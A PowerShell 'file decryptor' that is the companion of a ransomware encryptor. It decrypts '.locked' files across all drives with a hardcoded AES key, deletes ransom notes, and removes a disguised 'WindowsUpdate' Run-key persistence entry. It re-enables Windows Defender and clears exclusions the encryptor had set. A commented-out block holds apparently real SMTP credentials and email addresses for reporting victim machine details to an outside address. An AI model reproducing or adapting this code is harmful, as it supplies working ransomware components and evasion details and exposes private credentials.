param(
    [string]$Mode = "decrypt",
    [string]$Extension = ".locked",
    [string]$Key = "AFQAbgBwAFMAaQB6AGkASABhAGMAawBsAGkAeQBvAHI="
)

# Error suppression
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "FILE DECRYPTOR TOOL" -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan

# Decryption key check
if ([string]::IsNullOrEmpty($Key)) {
    Write-Host "ERROR: Decryption key is required!" -ForegroundColor Red
    Write-Host "Usage: .\Decryptor.ps1 -Key 'YOUR_BASE64_KEY'" -ForegroundColor Yellow
    exit
}

# Get all drives
$Drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Used -gt 0 } | Select-Object -ExpandProperty Root

# Target paths to search for encrypted files (same as encryptor)
$TargetPaths = @()
foreach ($drive in $Drives) {
    $TargetPaths += $drive
}

# Add specific system paths
$systemPaths = @(
    "C:\Windows",
    "C:\Program Files",
    "C:\Program Files (x86)",
    "C:\ProgramData",
    "$env:USERPROFILE",
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Pictures",
    "$env:USERPROFILE\Music",
    "$env:USERPROFILE\Videos",
    "$env:USERPROFILE\Downloads"
)

$TargetPaths += $systemPaths

# Collect all encrypted files
$EncryptedFiles = @()
$fileCount = 0

foreach ($path in $TargetPaths) {
    try {
        if (Test-Path $path -ErrorAction SilentlyContinue) {
            # Search for files with the encryption extension
            $files = Get-ChildItem -Path $path -Filter "*$Extension" -Recurse -Force -ErrorAction SilentlyContinue | 
                    Where-Object { -not $_.PSIsContainer }
            
            $fileCount += $files.Count
            $EncryptedFiles += $files
            
            if ($files.Count -gt 0) {
                Write-Host "Found $($files.Count) encrypted files in $path" -ForegroundColor Yellow
            }
        }
    }
    catch {
        continue
    }
}

# Remove duplicates
$EncryptedFiles = $EncryptedFiles | Sort-Object -Unique -Property FullName

if (-not $EncryptedFiles -or $EncryptedFiles.Count -eq 0) {
    Write-Host "No encrypted files found with extension: $Extension" -ForegroundColor Red
    exit
}

Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "Total encrypted files found: $($EncryptedFiles.Count)" -ForegroundColor Cyan
Write-Host "Decryption Key: (Base64 provided)" -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan

Write-Host "WARNING: This will attempt to decrypt all files with extension '$Extension'" -ForegroundColor Yellow
Write-Host "Make sure you have a backup of encrypted files before proceeding!" -ForegroundColor Yellow

$confirmation = Read-Host "Do you want to continue? (Y/N)"
if ($confirmation -ne 'Y' -and $confirmation -ne 'y') {
    Write-Host "Decryption cancelled." -ForegroundColor Red
    exit
}

# Setup decryption
try {
    $DecryptionKey = [System.Convert]::FromBase64String($Key)
    
    $AES = [System.Security.Cryptography.Aes]::Create()
    $AES.KeySize = 256
    $AES.BlockSize = 128
    $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $AES.Key = $DecryptionKey
    
    Write-Host "Encryption algorithm initialized: AES-256-CBC" -ForegroundColor Green
}
catch {
    Write-Host "ERROR: Failed to initialize decryption. Invalid key?" -ForegroundColor Red
    exit
}

# Decrypt files
$decryptedCount = 0
$failedCount = 0
$failedFiles = @()

foreach ($file in $EncryptedFiles) {
    try {
        $encryptedPath = $file.FullName
        $originalPath = $encryptedPath -replace [regex]::Escape($Extension) + '$', ''
        
        Write-Host "Decrypting: $encryptedPath" -ForegroundColor Gray
        
        # Read encrypted file
        $encryptedBytes = [System.IO.File]::ReadAllBytes($encryptedPath)
        
        # Extract IV (first 16 bytes)
        $ivLength = 16
        $iv = New-Object byte[] $ivLength
        [System.Array]::Copy($encryptedBytes, 0, $iv, 0, $ivLength)
        
        # Extract encrypted data (rest of the file)
        $dataLength = $encryptedBytes.Length - $ivLength
        $encryptedData = New-Object byte[] $dataLength
        [System.Array]::Copy($encryptedBytes, $ivLength, $encryptedData, 0, $dataLength)
        
        # Set IV and create decryptor
        $AES.IV = $iv
        $decryptor = $AES.CreateDecryptor()
        
        # Decrypt data
        $decryptedBytes = $decryptor.TransformFinalBlock($encryptedData, 0, $encryptedData.Length)
        
        # Write decrypted data to original file
        [System.IO.File]::WriteAllBytes($originalPath, $decryptedBytes)
        
        # Verify decryption was successful
        if (Test-Path $originalPath -ErrorAction SilentlyContinue) {
            # Delete the encrypted file
            Remove-Item -Path $encryptedPath -Force -ErrorAction SilentlyContinue
            $decryptedCount++
            
            # Show progress every 10 files
            if ($decryptedCount % 10 -eq 0) {
                Write-Host "Decrypted $decryptedCount files..." -ForegroundColor Green
            }
        }
        else {
            throw "Failed to write decrypted file"
        }
        
        # Cleanup
        $decryptor.Dispose()
        $encryptedBytes = $null
        $decryptedBytes = $null
        $encryptedData = $null
        [System.GC]::Collect()
        [System.GC]::WaitForPendingFinalizers()
    }
    catch {
        $failedCount++
        $failedFiles += $file.FullName
        Write-Host "Failed to decrypt: $($file.FullName)" -ForegroundColor Red
        continue
    }
}

# Cleanup AES object
if ($AES -ne $null) {
    $AES.Dispose()
}

# Remove ransom notes
Write-Host "Cleaning up ransom notes..." -ForegroundColor Cyan
$noteLocations = @(
    [Environment]::GetFolderPath("Desktop"),
    "$env:USERPROFILE",
    "C:\",
    "C:\Windows",
    "C:\Windows\System32",
    "C:\Program Files",
    "C:\ProgramData"
)

foreach ($location in $noteLocations) {
    try {
        $notePath = Join-Path $location "READ_ME.txt"
        if (Test-Path $notePath -ErrorAction SilentlyContinue) {
            Remove-Item -Path $notePath -Force -ErrorAction SilentlyContinue
        }
    }
    catch {
        continue
    }
}

# Remove persistence from registry
Write-Host "Removing persistence from registry..." -ForegroundColor Cyan
try {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "WindowsUpdate"
    Remove-ItemProperty -Path $regPath -Name $regName -Force -ErrorAction SilentlyContinue
    
    $regPath2 = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
    Remove-ItemProperty -Path $regPath2 -Name $regName -Force -ErrorAction SilentlyContinue
}
catch {
    # Silently continue
}

# Re-enable Windows Defender
Write-Host "Re-enabling Windows Defender..." -ForegroundColor Cyan
try {
    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $false -ErrorAction SilentlyContinue
    
    # Remove exclusions
    Remove-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
    Remove-MpPreference -ExclusionPath "D:\" -ErrorAction SilentlyContinue
    Remove-MpPreference -ExclusionPath "E:\" -ErrorAction SilentlyContinue
}
catch {
    # Silently continue
}

# Results
Write-Host "==========================================" -ForegroundColor Green
Write-Host "DECRYPTION COMPLETE" -ForegroundColor Green
Write-Host "==========================================" -ForegroundColor Green
Write-Host "Successfully decrypted: $decryptedCount files" -ForegroundColor Cyan
Write-Host "Failed: $failedCount files" -ForegroundColor Yellow

if ($failedCount -gt 0) {
    Write-Host "==========================================" -ForegroundColor Red
    Write-Host "Failed files:" -ForegroundColor Red
    foreach ($failedFile in $failedFiles) {
        Write-Host "  - $failedFile" -ForegroundColor Red
    }
}

Write-Host "==========================================" -ForegroundColor Green
Write-Host "Ransom notes and registry entries removed" -ForegroundColor Green
Write-Host "Windows Defender re-enabled" -ForegroundColor Green
Write-Host "==========================================" -ForegroundColor Green

if ($failedCount -eq 0) {
    Write-Host "ALL FILES SUCCESSFULLY DECRYPTED!" -ForegroundColor Green
} else {
    Write-Host "Some files failed to decrypt. Check the list above." -ForegroundColor Yellow
    Write-Host "Possible reasons: Corrupted files, wrong encryption key, or file permissions." -ForegroundColor Yellow
}

# Create decryption report
$report = @"
Decryption Report
=================
Date: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
Computer: $env:COMPUTERNAME
User: $env:USERNAME
Total files found: $($EncryptedFiles.Count)
Successfully decrypted: $decryptedCount
Failed: $failedCount
Encryption key used: (Base64 provided)
Extension removed: $Extension

Failed Files:
$(($failedFiles | ForEach-Object { "  - $_" }) -join "`n")
"@

# Save report to desktop
$desktopPath = [Environment]::GetFolderPath("Desktop")
$reportPath = Join-Path $desktopPath "Decryption_Report.txt"
Set-Content -Path $reportPath -Value $report -Encoding UTF8

Write-Host "Detailed report saved to: $reportPath" -ForegroundColor Cyan

# Optional: Send email report
try {
    $EmailBody = @"
Decryption Process Complete
===========================
Computer: $env:COMPUTERNAME
User: $env:USERNAME
Files decrypted: $decryptedCount
Failed files: $failedCount
Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')

Decryption Key Used: (Base64 key)
"@
    
    # Uncomment to send email report
    # $SMTP = "mail.netiletisim.com.tr"
    # $From = "efe.aslan@netiletisim.com.tr"
    # $To = "efeaslan1995@gmail.com"
    # $Password = ConvertTo-SecureString "U)q(ug=88KPT" -AsPlainText -Force
    # $Credential = New-Object System.Management.Automation.PSCredential($From, $Password)
    # Send-MailMessage -From $From -To $To -Subject "Decryption Report: $env:COMPUTERNAME" -Body $EmailBody -SmtpServer $SMTP -Port 25 -Credential $Credential -ErrorAction SilentlyContinue
}
catch {
    # Silently fail
}

Write-Host "Press any key to exit..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")